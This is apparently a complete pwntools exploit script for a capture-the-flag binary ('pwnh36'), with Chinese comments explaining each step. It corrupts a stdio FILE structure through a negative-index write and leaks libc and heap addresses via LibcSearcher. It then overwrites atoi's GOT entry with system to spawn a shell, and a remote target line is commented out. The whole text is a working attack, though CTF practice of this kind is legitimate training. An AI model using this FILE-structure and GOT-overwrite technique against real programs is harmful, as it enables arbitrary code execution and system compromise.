from pwn import *  
from LibcSearcher import *  
  
sh = process('./pwnh36')  
#sh = remote('111.198.29.45',41210)  
elf = ELF('./pwnh36')  
atoi_got = elf.got['atoi']  
log_addr = elf.symbols['log_file']  
  
def create():  
   sh.sendlineafter('choice>> ','1')  
   sh.sendlineafter("Give me the wizard's name:","seaase")  
  
def WizardSpell(index,content):  
   sh.sendlineafter('choice>> ','2')  
   sh.sendlineafter('Who will spell:',str(index))  
   sh.sendafter('Spell name:',content)  
  
#这两步是为了初始化FILE的结构体  
create()  
WizardSpell(0,'seaase')  
#修改log_file结构体的_IO_write_base  
for i in range(8):  
   #_IO_write_base = _IO_write_base + 1 - 50  
   WizardSpell(-2,'\x00')  
  
#在不影响log_file结构体的情况下，我们抬升_IO_write_base 13个字节，然后再-=50  
WizardSpell(-2,'\x00'*13)  
  
for i in range(3):  
   #_IO_write_base = _IO_write_base + 1 - 50  
   WizardSpell(-2,'\x00')  
  
#在不影响log_file结构体的情况下，我们抬升_IO_write_base 9个字节，然后再-=50  
WizardSpell(-2,'\x00'*9)  
WizardSpell(-2,'\x00')  
  
#现在，_IO_write_base指向了log_file的结构体附近处，我们可以修改log_file的结构体了  
payload = '\x00' * 3 + p64(0x231)  
#flags  
payload += p64(0xFBAD24A8)  
WizardSpell(0,payload)  
#_IO_read_ptr  _IO_read_end  
payload = p64(atoi_got) + p64(atoi_got+0x100)  
WizardSpell(0,payload)  
atoi_addr = u64(sh.recv(8))  
print hex(atoi_addr)  
  
libc = LibcSearcher('atoi',atoi_addr)  
libc_base = atoi_addr - libc.dump('atoi')  
system_addr = libc_base + libc.dump('system')  
  
#回到之前的位置  
WizardSpell(-2, p64(0) + p64(0))  
#重新写  
WizardSpell(0, '\x00' * 2 + p64(0x231) + p64(0xfbad24a8))  
#需要_IO_read_ptr大于等于_IO_read_end，经过调试，发现输出以后，发现0x50正好  
WizardSpell(0, p64(log_addr) + p64(log_addr + 0x50) + p64(log_addr))  
#泄露log_file结构体的地址  
heap_addr = u64(sh.recvn(8)) - 0x10  
print 'heap addr:',hex(heap_addr)  
  
WizardSpell(0,p64(heap_addr + 0x100)*3)  
#覆盖_IO_buf_base和_IO_buf_end  
#然后程序中执行fread就会修改_IO_write_ptr为_IO_buf_base  
WizardSpell(0,p64(atoi_got+0x78 + 23) + p64(atoi_got + 0xA00))  
  
#  
WizardSpell(-2,'\x00')  
WizardSpell(-2,'\x00'*3)  
WizardSpell(-2,'\x00'*3)  
  
payload = '\x00' + p64(system_addr)  
WizardSpell(0,payload)  
#getshell  
sh.sendlineafter('choice>> ','sh')  
  
sh.interactive()  